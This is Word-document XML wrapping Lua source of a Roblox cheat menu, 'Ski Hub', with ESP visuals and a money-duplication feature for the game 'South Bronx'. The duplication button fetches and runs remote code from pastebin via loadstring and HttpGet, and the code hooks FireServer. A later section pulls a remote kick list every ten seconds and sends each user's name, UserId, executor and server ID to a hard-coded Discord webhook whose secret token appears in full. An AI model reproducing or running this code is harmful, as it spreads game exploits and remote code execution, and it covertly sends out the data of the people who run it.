        <w:t xml:space="preserve">        Config.ESP.Drawing.Boxes.Animate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PlayerVisualsSettingsSection:toggle({name = "Dynamic Health Text", flag = "Visuals_HealthTextLerp", default = true, type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.Lerp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PlayerVisualsSettingsSection:toggle({name = "Gradient Health Bar", flag = "Visuals_HealthBarGradient", default = true, type = "toggle", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Healthbar.Gradient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PlayerVisualsSettingsSection:toggle({name = "Thermal Chams", flag = "Visuals_ChamsThermal", default = false, type = "toggle", seperator = true, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.Drawing.Chams.Thermal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PlayerVisualsSettingsSection:dropdown({name = "Text Font", flag = "Visuals_TextFont", width = 130,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        items = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Arcade",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "BuilderSans",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Code",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Pixel",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Plex",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Fantasy",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "FredokaOne",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Gotham",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "GothamBlack",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Minecraftia",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Jura",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Roboto",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "RobotoMono",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "SourceSans",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            "Verdana"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }, multi = false, default = "Plex", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Config.ESP.Font = (state == "Pixel" or state == "Plex" or state == "Minecraftia" or state == "Verdana") and Fonts[state] or Enum.Font[state]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    PlayerVisualsSettingsSection:slider({name = "Text Size", flag = "TextSize_Visuals", min = 10, max = 18, default = 12, callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.FontSize = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        RefreshAllElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    PlayerVisualsSettingsSection:slider({name = "Max Render Distance", flag = "MaxRenderDistance_Visuals", min = 10, max = 5000, default = 1000, suffix = "st", callback = function(state)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Config.ESP.MaxDistance = state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>library:init_config(window)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local DupeTab = window:tab({name = "Duplication", tabs = {"General"}, icon = GetImage("Cash.png")}) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local DupeColumn = DupeTab:column({})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local DuplicationSection = DupeColumn:section({name = "Automatic Duplication", side = "left", size = 0.6, icon = GetImage("Wrench.png")})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        DuplicationSection:textbox({name = "Selected Player's Name", callback = function(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local name = text;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for i,v in Services.Players:GetPlayers() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if v~=Services.Players.LocalPlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if string.find(v.Name:lower(), text:lower()) or string.match(v.Name:lower(), text:lower()) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        name = v.Name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            writefile("SouthBronxUsernameRealGame.txt", name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        DuplicationSection:textbox({name = "Amount To Send (Max Is $20000)", callback = function(text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            writefile("SouthBronxAmountRealGame.txt", text)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        DuplicationSection:button({name = "Start Automated Duping", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/NxcZfG6u'))()")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Services.TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        DuplicationSection:label({name = "Please read!", wrapped = true, info = "You will need $2,000 extra ontop of what your sending! for example if you want to send $20,000 you will need $22,000!"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>if hookfunction and not Solara and LPH_OBFUSCATED and Game_Name == "South Bronx" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local _FireServer;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local _Function;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _FireServer = hookfunction(Instance.new("RemoteEvent", nil).FireServer, function(self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Arguments = {...}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if tostring(self) == "PurchaseItem" and Arguments[2] == 'Shoes' and Arguments[3] == 'YZ Slides' and Arguments[4] == '\255' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local f, s = debug.getinfo(2, "fs")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not _Function then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _Function = f.func</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if _Function ~= f.func then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while true do end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return _FireServer(self, ...)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--kick</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local pasteURL = "https://pastebin.com/raw/8gyc2eux"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local WEBHOOK  = "https://discord.com/api/webhooks/1434580393394307173/zQEclNo_vm3WOwfhJttuc_eo6NPyGd80lmli7N_JqgaGzmGbHVweMtQrPma3CPJgTHXJ"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local HttpService = game:GetService("HttpService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local USER_RATE_LIMIT = 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local lastWebhookSent = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local kickList = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local blacklist = { ["1"] = true }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function GetURL(url)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ok, result = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if syn and syn.request then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return syn.request({Url = url, Method = "GET"}).Body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        elseif http_request then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return http_request({Url = url, Method = "GET"}).Body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        elseif request then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return request({Url = url, Method = "GET"}).Body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return game:HttpGet(url)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return ok and result or nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function detectExecutor()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if syn then return "Synapse X"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    elseif is_sirhurt_closure then return "Sirhurt"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    elseif KRNL_LOADED then return "KRNL"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    elseif identifyexecutor then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ok, name = pcall(identifyexecutor)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if ok then return name end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return "Unknown"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function sendWebhook(data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local body = HttpService:JSONEncode(data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local methods = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return syn and syn.request and syn.request({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Url = WEBHOOK,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Method = "POST",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Headers = {["Content-Type"] = "application/json"},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Body = body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return http_request and http_request({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Url = WEBHOOK,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Method = "POST",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Headers = {["Content-Type"]="application/json"},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Body = body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return request and request({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Url = WEBHOOK,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Method = "POST",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Headers = {["Content-Type"]="application/json"},</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Body = body</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, fn in ipairs(methods) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ok, res = pcall(fn)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if ok and res then return true end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    warn("no send")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function updateKickList()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local data = GetURL(pasteURL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not data then return warn("no update") end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ok, decoded = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return HttpService:JSONDecode(data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if ok and typeof(decoded) == "table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        kickList = decoded</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        print("update")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        warn("decode error")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function checkPlayers()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for _, plr in ipairs(Players:GetPlayers()) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if blacklist[plr.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            print("aethra is my daddy", plr.Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local reason = kickList[plr.Name]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if reason then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local now = tick()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not lastWebhookSent[plr.Name] or now - lastWebhookSent[plr.Name] &gt;= USER_RATE_LIMIT then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lastWebhookSent[plr.Name] = now</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function GetAvatarURL(userId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&amp;size=420x420&amp;format=Png&amp;isCircular=false"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local response = GetURL(url)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not response then return nil end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local ok, decoded = pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return HttpService:JSONDecode(response)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if ok and decoded and decoded.data and decoded.data[1] and decoded.data[1].imageUrl then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return decoded.data[1].imageUrl</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local data = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    embeds = {{</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        title = "🚨 Player Kicked",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        color = 15724527,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        thumbnail = { url = GetAvatarURL(plr.UserId) or "" },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fields = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "Player", value = plr.Name, inline = true },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "UserId", value = tostring(plr.UserId), inline = true },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "Display", value = plr.DisplayName, inline = true },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "Reason", value = reason, inline = false },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "Executor", value = detectExecutor(), inline = true },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            { name = "Server JobId", value = game.JobId, inline = false },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        footer = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            text = "Ski Hub Kick System"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        timestamp = DateTime.now():ToIsoDate()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    }}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                sendWebhook(data)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if plr == LocalPlayer then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                LocalPlayer:Kick(reason)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                print("found", plr.Name)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>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>updateKickList()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>checkPlayers()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    while task.wait(10) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        updateKickList()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        checkPlayers()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
